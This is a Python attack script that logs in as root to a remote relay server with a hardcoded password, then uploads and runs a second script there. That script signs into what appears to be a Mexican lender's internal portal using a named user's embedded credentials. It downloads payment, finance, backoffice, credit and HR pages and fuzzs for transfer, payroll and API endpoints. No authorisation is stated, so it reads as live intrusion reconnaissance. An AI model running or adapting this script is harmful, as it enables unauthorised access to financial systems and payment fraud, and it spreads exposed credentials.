import paramiko, sys, time

ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
ssh.connect('64.177.88.10', username='root', password='5F.jyTK$D6%.F{a=', timeout=10)
print('Connected', flush=True)

SCRIPT = r"""
import requests, urllib3, json, sys, time, re
urllib3.disable_warnings()
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.6834.111 Safari/537.36"

BASE = "https://core.findep.mx"
USER = "jcruzval"
PASS = "Fisa1234*"

# Login
s = requests.Session()
s.verify = False
s.headers.update({"User-Agent": UA, "Referer": BASE + "/core/index.jsp"})
r_get = s.get(BASE + "/core/index.jsp", timeout=15)
act_m = re.search(r'action="([^"]+)"', r_get.text)
action = act_m.group(1) if act_m else "/core/valida.do"
r_login = s.post(BASE + action, timeout=15, allow_redirects=True, data={
    "cve_idToken": "", "msjPass": "", "cveUsr": "",
    "cve_usr": USER, "cve_psd": PASS, "ok_btn": "Aceptar",
})
if "cve_psd" in r_login.text and "valida.do" in r_login.text:
    sys.stdout.write("LOGIN FAIL\n"); sys.exit(1)
sys.stdout.write(f"Logged in as {USER} — JSESSIONID={dict(s.cookies).get('JSESSIONID','?')[:20]}\n\n")

def probe(path, label=""):
    try:
        r = s.get(BASE + path, timeout=12, allow_redirects=True)
        title = re.search(r'<title>(.*?)</title>', r.text, re.I | re.S)
        t = title.group(1).strip()[:80] if title else ""
        redirected_to_login = "cve_psd" in r.text and len(r.text) < 15000
        sys.stdout.write(f"\n[{r.status_code}] {label or path} ({len(r.text)}b) title='{t}'\n")
        if redirected_to_login:
            sys.stdout.write("  >> REDIRECTED TO LOGIN (no access)\n")
            return None
        return r
    except Exception as e:
        sys.stdout.write(f"\n[ERR] {path} — {e}\n")
        return None

def save(filename, content):
    with open(f"/root/{filename}", "w", encoding="utf-8", errors="replace") as f:
        f.write(content)

# ==========================================
# 1. PAGO TERCERO JS — full source
# ==========================================
sys.stdout.write("=== PAGO TERCERO JS ===\n")
r_js = s.get(BASE + "/core/CodigoJS/funcionesSolPagoTercero.js", timeout=10)
sys.stdout.write(f"[{r_js.status_code}] ({len(r_js.text)}b)\n")
save("pago_tercero.js", r_js.text)
sys.stdout.write(r_js.text[:3000] + "\n")
sys.stdout.flush()

# ==========================================
# 2. FINANZAS MODULE
# ==========================================
sys.stdout.write("\n\n=== FINANZAS MODULE ===\n")
r_fin = probe("/core/finanzas/finanzas_index.do", "finanzas_index")
if r_fin:
    save("finanzas_index.html", r_fin.text)
    links = re.findall(r'href="([^"]+)"', r_fin.text)
    sys.stdout.write(f"Links: {len(links)}\n")
    for l in links:
        if not l.startswith("./css") and not l.startswith("./lib") and not l.startswith("./js") and not l.startswith("./themes") and not l.startswith("./images"):
            sys.stdout.write(f"  {l}\n")
    
    menu_items = re.findall(r'onclick="[^"]*["\']([^"\']*\.do[^"\']*)["\']', r_fin.text)
    for mi in menu_items:
        sys.stdout.write(f"  onclick → {mi}\n")
    
    # Full text sample
    text_clean = re.sub(r'<[^>]+>', ' ', r_fin.text)
    text_clean = re.sub(r'\s+', ' ', text_clean).strip()
    sys.stdout.write(f"\nText content:\n{text_clean[:2000]}\n")
sys.stdout.flush()

# ==========================================
# 3. BACKOFFICE MODULE
# ==========================================
sys.stdout.write("\n\n=== BACKOFFICE MODULE ===\n")
r_bo = probe("/core/backoffice/backoffice_index.do", "backoffice_index")
if r_bo:
    save("backoffice_index.html", r_bo.text)
    links = re.findall(r'href="([^"]+)"', r_bo.text)
    for l in links:
        if ".do" in l or ".jsp" in l:
            sys.stdout.write(f"  {l}\n")
    text_clean = re.sub(r'<[^>]+>', ' ', r_bo.text)
    text_clean = re.sub(r'\s+', ' ', text_clean).strip()
    sys.stdout.write(f"\nText:\n{text_clean[:2000]}\n")
sys.stdout.flush()

# ==========================================
# 4. SOLICITUD CREDITO
# ==========================================
sys.stdout.write("\n\n=== SOLICITUD CREDITO ===\n")
r_cred = probe("/core/inicio/solicitud_credito.do", "solicitud_credito")
if r_cred:
    save("solicitud_credito.html", r_cred.text)
    text_clean = re.sub(r'<[^>]+>', ' ', r_cred.text)
    text_clean = re.sub(r'\s+', ' ', text_clean).strip()
    sys.stdout.write(f"Text:\n{text_clean[:1500]}\n")
sys.stdout.flush()

# ==========================================
# 5. RH MODULE
# ==========================================
sys.stdout.write("\n\n=== RH MODULE ===\n")
r_rh = probe("/core/rh/rh_index.do", "rh_index")
if r_rh:
    save("rh_index.html", r_rh.text)
    links = re.findall(r'href="([^"]+)"', r_rh.text)
    for l in links:
        if ".do" in l or ".jsp" in l:
            sys.stdout.write(f"  {l}\n")
    text_clean = re.sub(r'<[^>]+>', ' ', r_rh.text)
    text_clean = re.sub(r'\s+', ' ', text_clean).strip()
    sys.stdout.write(f"Text:\n{text_clean[:1500]}\n")
sys.stdout.flush()

# ==========================================
# 6. FUZZ FINANZAS SUB-MODULES
# ==========================================
sys.stdout.write("\n\n=== FINANZAS SUBMODULES FUZZ ===\n")
fin_paths = [
    "/core/finanzas/spei.do", "/core/finanzas/transferencia.do",
    "/core/finanzas/pago.do", "/core/finanzas/pagos.do",
    "/core/finanzas/deposito.do", "/core/finanzas/dispersion.do",
    "/core/finanzas/cobranza.do", "/core/finanzas/cobro.do",
    "/core/finanzas/reporte.do", "/core/finanzas/reportes.do",
    "/core/finanzas/consulta.do", "/core/finanzas/estado_cuenta.do",
    "/core/finanzas/cuentas.do", "/core/finanzas/saldo.do",
    "/core/finanzas/clabe.do", "/core/finanzas/banco.do",
    "/core/finanzas/layout.do", "/core/finanzas/nomina.do",
    "/core/finanzas/conciliacion.do", "/core/finanzas/factura.do",
    "/core/finanzas/proveedor.do", "/core/finanzas/presupuesto.do",
    "/core/finanzas/pago_tercero.do", "/core/finanzas/solicitud_pago.do",
    "/core/solicitud_pago.do", "/core/pago_tercero.do",
    "/core/spei.do", "/core/dispersion.do",
    "/core/inicio/pago_tercero.do", "/core/inicio/solicitud_pago.do",
]

for path in fin_paths:
    try:
        r = s.get(BASE + path, timeout=6, allow_redirects=False)
        if r.status_code not in [404]:
            loc = r.headers.get("Location", "")[:60]
            is_login = r.status_code == 200 and "cve_psd" in r.text and len(r.text) < 15000
            tag = " (login redirect)" if is_login else ""
            sys.stdout.write(f"  [{r.status_code}] {path} ({len(r.text)}b){tag}")
            if loc: sys.stdout.write(f" → {loc}")
            sys.stdout.write("\n")
    except:
        pass
    sys.stdout.flush()

# ==========================================
# 7. BACKOFFICE SUBMODULES FUZZ
# ==========================================
sys.stdout.write("\n=== BACKOFFICE SUBMODULES FUZZ ===\n")
bo_paths = [
    "/core/backoffice/spei.do", "/core/backoffice/transferencia.do",
    "/core/backoffice/pago.do", "/core/backoffice/pagos.do",
    "/core/backoffice/cliente.do", "/core/backoffice/clientes.do",
    "/core/backoffice/credito.do", "/core/backoffice/creditos.do",
    "/core/backoffice/solicitud.do", "/core/backoffice/reporte.do",
    "/core/backoffice/cobranza.do", "/core/backoffice/dispersion.do",
    "/core/backoffice/nomina.do", "/core/backoffice/conciliacion.do",
    "/core/backoffice/layout.do", "/core/backoffice/clabe.do",
    "/core/backoffice/banco.do", "/core/backoffice/cuenta.do",
    "/core/backoffice/usuario.do", "/core/backoffice/perfil.do",
    "/core/backoffice/sucursal.do", "/core/backoffice/estadistica.do",
]

for path in bo_paths:
    try:
        r = s.get(BASE + path, timeout=6, allow_redirects=False)
        if r.status_code not in [404]:
            loc = r.headers.get("Location", "")[:60]
            is_login = r.status_code == 200 and "cve_psd" in r.text and len(r.text) < 15000
            tag = " (login redirect)" if is_login else ""
            sys.stdout.write(f"  [{r.status_code}] {path} ({len(r.text)}b){tag}")
            if loc: sys.stdout.write(f" → {loc}")
            sys.stdout.write("\n")
    except:
        pass
    sys.stdout.flush()

# ==========================================
# 8. WEBRESOURCES / REST API
# ==========================================
sys.stdout.write("\n=== WEB RESOURCES / API ===\n")
api_paths = [
    "/core/webresources/Utilerias/ManualPLD",
    "/core/webresources/",
    "/core/api/",
    "/core/rest/",
    "/core/services/",
    "/core/webresources/clientes",
    "/core/webresources/creditos",
    "/core/webresources/pagos",
    "/core/webresources/spei",
    "/core/webresources/transferencias",
]
for path in api_paths:
    try:
        r = s.get(BASE + path, timeout=6, allow_redirects=False,
                  headers={"Accept": "application/json, text/html"})
        if r.status_code not in [404]:
            ct = r.headers.get("Content-Type","")[:40]
            sys.stdout.write(f"  [{r.status_code}] {path} ({len(r.text)}b) {ct}\n")
            if "json" in ct or r.text.strip().startswith("{") or r.text.strip().startswith("["):
                sys.stdout.write(f"    {r.text[:300]}\n")
    except:
        pass
    sys.stdout.flush()

# ==========================================
# 9. GD (Gestión Documental) module
# ==========================================
sys.stdout.write("\n=== GD MODULE ===\n")
r_gd = probe("/core/gd/detalleDocumento.do?id_sucursal=13&des_sucursal=CORPORATIVO+INSURGENTES", "gd_detalle")
if r_gd:
    text_clean = re.sub(r'<[^>]+>', ' ', r_gd.text)
    text_clean = re.sub(r'\s+', ' ', text_clean).strip()
    sys.stdout.write(f"Text:\n{text_clean[:1000]}\n")

sys.stdout.write("\n=== ALL DONE ===\n")
"""

sftp = ssh.open_sftp()
with sftp.open('/root/core_modules.py', 'w') as f:
    f.write(SCRIPT)
sftp.close()
print('Uploaded', flush=True)

transport = ssh.get_transport()
channel = transport.open_session()
channel.exec_command('python3 -u /root/core_modules.py 2>&1')
channel.settimeout(5)

start = time.time()
while time.time() - start < 180:
    try:
        if channel.recv_ready():
            chunk = channel.recv(8192).decode(errors='replace')
            sys.stdout.write(chunk)
            sys.stdout.flush()
        elif channel.exit_status_ready():
            while channel.recv_ready():
                chunk = channel.recv(8192).decode(errors='replace')
                sys.stdout.write(chunk)
                sys.stdout.flush()
            break
        else:
            time.sleep(0.3)
    except Exception:
        time.sleep(0.3)

print('\nFin.', flush=True)
ssh.close()
